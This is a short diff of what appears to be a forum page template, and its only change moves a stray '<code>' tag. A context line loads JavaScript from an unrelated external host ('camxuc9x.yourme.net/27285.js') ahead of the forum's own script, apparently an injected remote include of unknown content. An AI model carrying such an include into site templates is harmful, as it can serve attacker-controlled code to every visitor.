@@ -1,5 +1,5 @@
-<code>
 
+<code>
 <script src="http://camxuc9x.yourme.net/27285.js" type="text/javascript"></script>
 <script src="{JS_DIR}extendedview.js" type="text/javascript"></script>
 <!-- BEGIN switch_user_logged_in -->
